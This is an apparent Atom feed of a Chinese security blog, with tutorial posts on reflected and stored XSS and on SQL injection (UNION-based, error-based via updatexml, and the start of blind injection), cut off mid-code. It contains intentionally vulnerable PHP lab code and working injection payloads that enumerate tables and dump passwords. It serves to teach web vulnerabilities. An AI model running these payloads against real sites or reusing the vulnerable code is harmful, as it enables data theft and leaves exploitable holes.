    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2023-05-12T12:25:55.301Z</published>
    <updated>2023-05-12T12:25:55.301Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</id>
    <published>2023-05-12T12:25:34.504Z</published>
    <updated>2023-05-12T12:25:34.504Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%7FRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%7FRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2023-05-12T12:25:22.727Z</published>
    <updated>2023-05-12T12:25:22.727Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>XSS跨站脚本攻击</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</id>
    <published>2023-05-12T12:25:07.653Z</published>
    <updated>2023-05-22T01:17:06.211Z</updated>
    
    <content type="html"><![CDATA[<p>XSS跨站脚本攻击</p><span id="more"></span><p>什么是 XSS ？</p><p>XSS全称：跨站脚本(Cross Site Scripting) ,为了不和层叠样式表(Cascading Style Sheets)的缩写CSS混合，所以改名为XSS；攻击者会向web 页面(input表单、URL、留言版等位置)插入恶意 JavaScript 代码，导致管理员&#x2F;用户访问时触发，从而达到攻击者的目的。</p><p>XSS 的核心要求就是构造出能够让前端执行的 JavaScript 代码，所以我们对 JavaScript 的代码必须熟悉。XSS 也算是注入类的漏洞，JavaScript 的代码注入，所以 XSS 漏洞更主要是攻击系统的用户，而不是系统本身。</p><h2 id="一、反射型"><a href="#一、反射型" class="headerlink" title="一、反射型"></a>一、反射型</h2><p>反射型 XSS。又称非持久型 XSS，攻击相对于受害者而言是一次性的，具体表现在受害者点击了含有的恶意 JavaScript 脚本的 url ，恶意代码并没有保存在目标网站，而 Web 应用程序只是不加处理的把该恶意脚本“反射”回受害者的浏览器而使受害者的浏览器执行相应的脚本。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你输入的内容是：<span class="subst">$content</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;请在地址栏输入content值&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用户可控输入一句弹窗的 js 代码，发现页面弹窗，说明存在 XSS 漏洞，刷新页面发现不再触发，说明是反射型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>他的缺点也很明显：<br> 1、必须用户点击带有特定恶意脚本代码参数的链接才能执行 。<br> 2、恶意代码存放在<code>url</code>中，只有用户在点击恶意链接的时候才会执行恶意代码，所有<strong>它的隐蔽性很差</strong>，可以直观的看到访问了怎样的站点，当然不了解的，也不容易看出来。</p><br><h2 id="二、存储型"><a href="#二、存储型" class="headerlink" title="二、存储型"></a>二、存储型</h2><p>存储型 XSS。恶意语句会进入到目标服务器中，包括但不限于数据库里面，存写进去的方式，比如网站的留言板，个人信息，文章发布等地方，如果这些地方未对传入的数据细致的过滤，就会有储存型XSS的产生。 <strong>其特点在于，持久性较长，危害性较大。</strong></p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;8.txt&#x27;</span>,<span class="variable">$content</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你输入的内容是：&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;8.txt&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;请在地址栏输入content值&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="三、DOM型"><a href="#三、DOM型" class="headerlink" title="三、DOM型"></a>三、DOM型</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;XSS跨站脚本攻击&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T12:24:50.319Z</published>
    <updated>2023-05-22T00:30:26.798Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入</p><span id="more"></span><p>什么是 SQL 注入？</p><p><strong>SQL注入（SQL Injectioin）</strong>漏洞是注入漏洞中危害性最高的漏洞之一。形成的原因主要是在数据交互过程中，前端的数据传入后端时，没有作严格的验证过滤导致传入的“数据”拼接到了 SQL 语句中。被数据库当作 SQL 语句的一部分执行，从而使得数据面临被脱库、恶意破坏篡改甚至造成整个系统权限沦陷等一系列危害。</p><p>注入攻击的本质是把用户输入的数据当作代码执行。造成注入攻击有两个关键条件：</p><p>1、用户能够控制数据输入</p><p>2、原本程序要执行的代码，拼接了用户输入的数据。</p><p>对SQL注入漏洞的挖掘虽然多数时候以工具为主，手工为辅助，但切忌上来就一把梭。</p><p>数据库自行配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据库名：learn</span><br><span class="line">表名：user</span><br><span class="line">列名：id，username，password</span><br><span class="line"><span class="comment">// 可以自行加一个 flag。</span></span><br></pre></td></tr></table></figure><p>接下来的实验都是以 get 方式来注入的，在实战的时候会搞成 post 方式，其实效果都一样，只是换了一个注入点，这里用 get 方式是为了看的更清楚，方便查看。</p><p>SQL 注入的重点是前三个，也就是联合注入、报错注入、盲注，这三个搞明白了后面过的会比较快。</p><br><h2 id="一、SQL-联合注入"><a href="#一、SQL-联合注入" class="headerlink" title="一、SQL 联合注入"></a>一、SQL 联合注入</h2><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL常规回显注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your username：&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your password：&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>SQL 联合注入，顾名思义也就是用语句 union 来联合查询，所以联合注入也是最基础的查询注入。</p><h3 id="1、数字型"><a href="#1、数字型" class="headerlink" title="1、数字型"></a>1、数字型</h3><p>数字型就是输入的数据是数字，不是字符串。这里查询结果返回，我们可以去看看后台的 SQL 语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=$id</span><br></pre></td></tr></table></figure><p>这个 SQL 语句代码直接就是去数据库中查找 id 这个值的全部信息。那么我们如果在输入的信息后拼接上我们要执行的恶意语句会怎么样呢？比如我们要查询 password 这个字段，我们知道，页面是返回不了 password 这个字段的，但是我们去构造语句拼接可以实现：</p><p><strong>SQL 注入的一般步骤：</strong></p><p>（1）首先查列。我们需要知道该表有多少列才能执行语句，语句 order by 是查列，后面的数字是该表的列数，如果不知道多少列就需要一个一个试，直到页面不再报错为止：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=$id order by 3</span><br></pre></td></tr></table></figure><p>（2）接下来是联合查询。也就是要用到 union 语句，在第一步的时候知道了该表的列数，那么利用 <code>union select 1,2,3</code> 返回的结果显示在页面上，<code>1，2，3</code> 是为了更清楚的知道显示的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=$id union select 1,2,3</span><br></pre></td></tr></table></figure><p>（3）接下来是查库。查看当前的数据库名称，<code>database() </code>不是说想放在就放在哪，需要放在能显示在页面的列上，例如列 1 和列 2 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=$id union select 1,(database()),3</span><br></pre></td></tr></table></figure><p>（4）接下来比较长了这个语句，查表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">group_concat()<span class="comment">#这个函数是拼接的作用</span></span><br><span class="line">information_schema<span class="comment">#这是一个数据库，存放表名的数据库</span></span><br><span class="line">tables<span class="comment">#这是上面那个数据库的表</span></span><br><span class="line">table_schema<span class="comment">#这个表示当前表的数据库名</span></span><br></pre></td></tr></table></figure><p>执行下面语句可以查出当前数据库的表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=$id union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;learn&#x27;;</span><br></pre></td></tr></table></figure><p>（5）查字段名。跟查表差不多就是改了几个地方，把 tables 改为 columns ，还有把 <code>table_name</code> 改为 <code>column_name</code>，后面还要加一个 <code>table_name=user</code> 这个条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=$id union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;learn&#x27; and table_name=&#x27;user&#x27;;</span><br></pre></td></tr></table></figure><p>（6）最后一步，查数据。上一步中我们知道了列名，也就是字段名。我们就可以利用字段名来查看当前字段所有的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=$id union select 1,group_concat(id,username,password),3 from learn.user;</span><br></pre></td></tr></table></figure><p>相比于上面的语句，最后的语句就少了很多，因为只需要后面的 <code>learn.user</code> 这个东西就可以定位了。</p><h3 id="2、字符型"><a href="#2、字符型" class="headerlink" title="2、字符型"></a>2、字符型</h3><p>那么字符型呢，跟数字型没什么区别，步骤都一样（没 waf 的情况下），只是利用方式不一样。原理也是利用的拼接。</p><p>对于字符型的 SQL 注入，我们可以传一个单引号看看会怎么样？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/SQL-1.png" alt="SQL-1"></p><p>可以看到会报错，那么为什么会这样，上面我们知道了数字型的 SQL 注入是因为拼接导致，那么字符型应该也是因为拼接导致的。后台的 SQL 语句是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=&#x27;1&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>而我们传入的数据是 <code>1&#39;</code> 所以就成了这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>因为分号跟后面的分号拼接，导致无法执行后面的语句，所以报错，那么我们如果去除后面的分号，是不是就可以构造 SQL 语句了。在 MySQL 中注释是 <code>#，--+，-- -</code> 这三个，可以利用注释，注释掉后面的语句就达到我们想要的目的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id=&#x27;1&#x27;#&#x27; LIMIT 0,1</span><br><span class="line">SELECT * FROM user WHERE id=&#x27;1&#x27;--+&#x27; LIMIT 0,1</span><br><span class="line">SELECT * FROM user WHERE id=&#x27;1&#x27;-- -&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>那么这样我们刷新页面，发现没有报错并且正常的显示，接下来的步骤就跟数字型的一样了，就是在数字型的基础上多了分号和注释而已，请读者自行尝试。这里就不赘述。</p><br><h2 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a>二、报错注入</h2><p>报错注入，顾名思义就是通过数据反馈出的错误信息提示进行注入攻击。通常情况下我们首先需要输入单引号判断是否存在报错，然后进一步找出注入点。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL报错注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;You are in ...&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>SQL 报错注入的步骤：</strong></p><p>1、因为这里是报错注入，他需要涉及到特殊的函数使他回显出来，下面介绍几个常见的报错注入的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、Updatexml</span><br><span class="line">2、ExtractValue</span><br><span class="line">3、Floor</span><br><span class="line">4、exp</span><br><span class="line">5、join</span><br></pre></td></tr></table></figure><p>可以看到上面的代码是没有回显，可以在页面进行测试，确实是没有回显，只会显示文字：<code>You are in ...</code> 。那么在这种没有回显的情况我们无法用联合注入，联合注入是需要显示在页面上的，那么没有回显是有两个方法，一个就是现在要讲的报错注入，另一个就是盲注，在下面会讲到。首先我们先来看看语句吧，拿较为常用的函数——<code>updatexml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p>可以看到 updatexml 这个函数的语法就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(1,(需要执行的语句),1),1)</span><br><span class="line">// 1 的地方随便放，里面那个括号的 1 可以放 0x7e，也就是 ~，为了看得更清楚</span><br></pre></td></tr></table></figure><p>其实 extractValue 这个函数的用法跟他一样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractValue(1,concat(1,(需要执行的语句),1),1)</span><br></pre></td></tr></table></figure><p>2、接下就跟联合注入一样，查表，查列，查数据。</p><p>这里演示一下查表的语句，接下来的步骤请读者自行完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;learn&#x27;),0x7e),1)#</span><br></pre></td></tr></table></figure><p>3、做完 SQL 注入的基本步骤，接下来介绍几个需要知道的函数，因为在最后一步查看数据的时候，报错注入经常会有一个问题，那就是数据不全，这是因为那条语句只会显示部分数据，所以认识几个函数可以显示更多的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substr()#substr(字段名，起始的位置，步长)从起始位置开始</span><br><span class="line">mid()#mid(字段名，起始的位置，步长)从起始位置开始</span><br><span class="line">left()#left(字段名，长度)从最左边开始</span><br><span class="line">right()#right(字段名，长度)从最后边开始</span><br></pre></td></tr></table></figure><p>有了上面的函数在最后查数据就可以查到比较完整的数据了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(password) from learn.user),1,1),0x7e),1)#</span><br></pre></td></tr></table></figure><br><h2 id="三、盲注"><a href="#三、盲注" class="headerlink" title="三、盲注"></a>三、盲注</h2><p>所谓盲注就是指不知道回显的内容，连报错也没有的注入，当然也不是盲目的注入，是利用判断来实现的。盲注有两种方式，布尔和时间，布尔就是根据字符串来判断，时间就是根据页面响应的时间来判断。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL盲注环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>, <span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span 